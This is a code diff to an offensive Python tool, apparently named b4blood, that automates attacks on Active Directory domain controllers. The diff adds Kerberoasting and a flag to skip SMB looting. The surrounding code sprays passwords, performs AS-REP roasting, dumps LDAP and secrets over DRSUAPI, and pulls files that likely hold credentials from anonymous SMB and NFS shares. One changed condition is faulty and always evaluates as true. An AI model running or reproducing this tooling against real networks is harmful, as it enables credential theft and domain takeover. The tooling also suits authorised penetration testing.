@@ -31,12 +31,13 @@ def parse_arg():
 	parser = argparse.ArgumentParser(description="b4blood --ip 192.168.0.40, b4blood --ip 192.168.0.0/24, b4blood --internal -i eth0")
 	parser.add_argument("--ip", help="Provide an IP or a range, 192.168.0.23, 192.168.8.*, 192.168.7.0/24")
 	parser.add_argument("--internal", action="store_true", help="DHCP broadcast resquest, you must be physicaly on the network.")
+	parser.add_argument("--nsd", action="store_true", help="no smb dump for saving time.")
 	parser.add_argument("-U", help="Provide your own userlist to Kerbrute users. Default xato-net-10-million-usernames. b4blood --ip 192.168.0.8 -U users.txt")
 	parser.add_argument("-P", help="Provide your own passlist to Kerbrute users. Default rockyou.txt. b4blood --ip 192.168.0.8 -P pass.txt, b4blood --ip 192.168.0.8 -U users.txt -P pass.txt")
 	parser.add_argument("-i", help="Interface for internal scan")
 	args = parser.parse_args()	
 	#print(args) 
-	return args.ip, args.internal, args.U, args.P, args.i
+	return args.ip, args.internal, args.U, args.P, args.i, args.nsd
 
 def asrepHashCredExtract(hash):
     hash=hash.replace("\n","")
@@ -64,7 +65,6 @@ def dumpLdapDB(cont, ip_to_scan, Domain_Name):
 
 	user=cred.split(":")[0]
 	passw=cred.split(":")[1].replace("\n","")
-	print()
 	printf(f" Dumping AD with {user}:{passw} --> ldap_from{user}/	"+yellow+f"You should run after the complete scan: b4blood --ip {ip_to_scan} -U users_from_{user}.txt",green)
 	os.system(f'if [ ! -d "ldapdump_from_{user}" ];then mkdir ldapdump_from_{user}; fi')
 	os.system(f'cd ldapdump_from_{user}; ldapdomaindump -u "{Domain_Name}\\{user}" -p {passw} {ip_to_scan} 2>/dev/null; cd ..')	
@@ -101,7 +101,7 @@ print()
 print("Find Domain Controller on a network, enumerate users, AS-REP Roasting and hash cracking, bruteforce password, dump AD users, scan SMB shares and remote accesses.")
 print("2023 by Moloch\n")
 
-ip,internal,U,P,interface = parse_arg()
+ip,internal,U,P,interface, nsd = parse_arg()
 ip_to_scan = ip
 
 if ip_to_scan == None and internal==False:
@@ -137,7 +137,7 @@ os.system("chmod +x libs/ntp_sync.sh")
 
 # script begins
 #os.system("rm * -rf /tmp/")
-if internal == True:
+if internal:
 	if interface==None:
 		printf(" Need an interface! sudo AD_exploit.py --internal -i eth0",red)
 		exit()
@@ -260,7 +260,7 @@ ip_to_scan=re.findall(reg,ip_to_scan)[0]
 
 printf(f" scanning the Domain Controller {ip_to_scan}", green)
 
-os.system(f'nmap {ip_to_scan} -p 22,139,389,445,2049,5985 -Pn | grep open > nmap_scan.txt; nmap {ip_to_scan} -p 3389 -sC -Pn >> nmap_scan.txt')
+os.system(f'nmap {ip_to_scan} -p 22,139,389,445,2049,3268,5985 -Pn | grep open > nmap_scan.txt; nmap {ip_to_scan} -p 3389 -sC -Pn >> nmap_scan.txt')
 os.system(f'cat nmap_scan.txt | grep DNS_Domain_Name | cut -d ":" -f2 >> DC.txt')
 
 with open('DC.txt', 'r') as fichier:
@@ -309,7 +309,7 @@ for item in contenu_nmap:
 		smb=1
 	if "5985/tcp" in item:
 		winrm=1
-	if "389/tcp" in item:
+	if "389/tcp" or "3268/tcp" in item:
 		ldap=1
 	if "2049/tcp" in item:
 		nfs=1
@@ -327,60 +327,60 @@ if smb==1:
 			os.system("rm smb_vuln.txt")
 
 		# scan anonymous shares
+		if not nsd:
+			os.system('if [ ! -d "smb_dump" ];then mkdir smb_dump; fi')
+			os.system('if [ ! -d "shares" ];then mkdir shares; fi')
+			printf(' scanning for anonymous smb shares  --> /smb_dump',green)
+			os.system(f"smbmap -H {ip_to_scan} -u ' ' -p ' ' | grep -v Working | tee shares/anonymous_shares.txt")
+			with open("shares/anonymous_shares.txt","r") as fic:
+				co=fic.readlines()
+			if len(co)<2:
+				print("via smbclient")
+				os.system(f"smbclient -L {ip_to_scan} -N | tee shares/anonymous_shares.txt")
 
-		os.system('if [ ! -d "smb_dump" ];then mkdir smb_dump; fi')
-		os.system('if [ ! -d "shares" ];then mkdir shares; fi')
-		printf(' scanning for anonymous smb shares  --> /smb_dump',green)
-		os.system(f"smbmap -H {ip_to_scan} -u ' ' -p ' ' | grep -v Working | tee shares/anonymous_shares.txt")
-		with open("shares/anonymous_shares.txt","r") as fic:
-			co=fic.readlines()
-		if len(co)<2:
-			print("via smbclient")
-			os.system(f"smbclient -L {ip_to_scan} -N | tee shares/anonymous_shares.txt")
+			with open("shares/anonymous_shares.txt","r") as fic:
+				co=fic.readlines()
 
-		with open("shares/anonymous_shares.txt","r") as fic:
-			co=fic.readlines()
+			if len(co) >1:
 
-		if len(co) >1:
+				# anonymous creds
+				# on dump all ici!
+				print("")
+				os.system("cat shares/anonymous_shares.txt | grep 'READ\|Disk' | awk '{print $1}' > shares/shares_.txt")
+				with open("shares/shares_.txt","r") as fichier3:
+					shares=fichier3.readlines()
+				os.chdir("./smb_dump")
+				file_content="account,compte,cred,user,pass,util,backup,note,vbs,ps1,bat,code,conf,cfg,rsa,pem,key,xml,xslx,doc,id,txt,zip".split(",")
+				for share in shares:
+					share=share.replace("\n","")
+					share=share.replace(" ","")
 
-			# anonymous creds
-			# on dump all ici!
-			print("")
-			os.system("cat shares/anonymous_shares.txt | grep 'READ\|Disk' | awk '{print $1}' > shares/shares_.txt")
-			with open("shares/shares_.txt","r") as fichier3:
-				shares=fichier3.readlines()
-			os.chdir("./smb_dump")
-			file_content="account,compte,cred,user,pass,util,backup,note,vbs,ps1,bat,code,conf,cfg,rsa,pem,key,xml,xslx,doc,id,txt,zip".split(",")
-			for share in shares:
-				share=share.replace("\n","")
-				share=share.replace(" ","")
-
-				# on récupère les directories récursivement		
-				cmd=f"smbclient //{ip_to_scan}/{share} -N -c 'recurse on;ls' | grep -E '^\\"+"\\"+"'" + "| awk '{print $1}' "+f" > ../shares/all_folders_{share}.txt"
-				print(blue+f"Dumping {share}	Could take a while..."+white)
-				os.system(cmd)
-				
-				# scan /
-				cmd=f"recurse on; prompt off;"
-				for fc in file_content:	
-					cmd+=f"mget *{fc}*;"
-
-				os.system(f'smbclient //{ip_to_scan}/{share} -N -c "{cmd}">/dev/null')
-
-				with open(f"../shares/all_folders_{share}.txt","r") as fshare:
-					contenu_fshare=fshare.readlines()
-
-				for folders in contenu_fshare:
-					folders=folders.replace("\n","")	
-					cmd=f"recurse on; prompt off;cd {folders};"
-					for fc in file_content:
+					# on récupère les directories récursivement		
+					cmd=f"smbclient //{ip_to_scan}/{share} -N -c 'recurse on;ls' | grep -E '^\\"+"\\"+"'" + "| awk '{print $1}' "+f" > ../shares/all_folders_{share}.txt"
+					print(blue+f"Dumping {share}	Could take a while..."+white)
+					os.system(cmd)
+					
+					# scan /
+					cmd=f"recurse on; prompt off;"
+					for fc in file_content:	
 						cmd+=f"mget *{fc}*;"
+
 					os.system(f'smbclient //{ip_to_scan}/{share} -N -c "{cmd}">/dev/null')
 
-			os.chdir("../")
-		print()
+					with open(f"../shares/all_folders_{share}.txt","r") as fshare:
+						contenu_fshare=fshare.readlines()
 
-		if os.listdir("./smb_dump"):
+					for folders in contenu_fshare:
+						folders=folders.replace("\n","")	
+						cmd=f"recurse on; prompt off;cd {folders};"
+						for fc in file_content:
+							cmd+=f"mget *{fc}*;"
+						os.system(f'smbclient //{ip_to_scan}/{share} -N -c "{cmd}">/dev/null')
+
+				os.chdir("../")
+			print()
+
+		if os.path.isdir("smb_dump"):
 			printf(" could be interesting in /smb_dump",green)
 			for filename in os.listdir("./smb_dump"):
 				print(yellow+filename+white)
@@ -416,7 +416,7 @@ if nfs:
 
 	for anon_share in anon_shares:
 		anon_share=anon_share.replace("\n","")
-		printf(f"try to mount {ip_to_scan}://{anon_share} and dumping in /NFS",green)
+		printf(f" try to mount {ip_to_scan}://{anon_share} and dumping in /NFS",green)
 		try:
 			os.system(f"mount -t nfs {ip_to_scan}:/{anon_share} /tmp/nfs_temp_{r}")
 		except:
@@ -434,7 +434,6 @@ if nfs:
 				print(yellow+filename+white)
 			os.chdir("../")
 			print()
-			### seems akward
 
 
 if U ==None:
@@ -545,6 +544,7 @@ if ldap:
 	if len(contenu) !=0:
 		dumpLdapDB(contenu, ip_to_scan, Domain_Name)
 
+
 if len(contenu) !=0:
 	print()
 	printf(" scanning SMB shares for passwords, DRSUAPI, remote access: --> /smb_dump", green)
@@ -554,7 +554,7 @@ if len(contenu) !=0:
 		passw=cred.split(":")[1].replace("\n","")
 		print(green+f"{user}:{passw}"+white)
 		
-		if smb:
+		if smb and not nsd:
 			os.system('if [ ! -d "smb_dump" ];then mkdir smb_dump; fi')
 			os.system('if [ ! -d "shares" ];then mkdir shares; fi')
 			os.system(f'smbmap -u {user} -p {passw} -d {Domain_Name} -H {ip_to_scan} | tee shares/smbshares_{user}.txt')
@@ -598,6 +598,7 @@ if len(contenu) !=0:
 					print(yellow+filename+white)
 				print()
 
+		if smb:
 			os.system(f'crackmapexec --timeout 2 smb {ip_to_scan} -u {user} -p {passw}')
 			os.system(f'python3 {path_impacket}/secretsdump.py  {Domain_Name}/{user}:{passw}@{ip_to_scan}')
 
@@ -606,6 +607,12 @@ if len(contenu) !=0:
 		if winrm:
 			os.system(f'crackmapexec --timeout 2 winrm {ip_to_scan} -u {user} -p {passw} --fail-limit 2 -d {Domain_Name}')
 		print()
+
+if len(contenu) !=0:
+	user=contenu[0].split(":")[0]
+	passw=contenu[0].split(":")[1].replace("\n","")
+	printf(" scanning Kerberoastable accounts:",green)
+	os.system(f"python /opt/impacket/examples/GetUserSPNs.py -dc-ip {ip_to_scan} {Domain_Name}/{user}:{passw} | grep -v Impacket")
 
 if os.path.isdir("./smb_dump"):
 	os.chdir("./smb_dump")
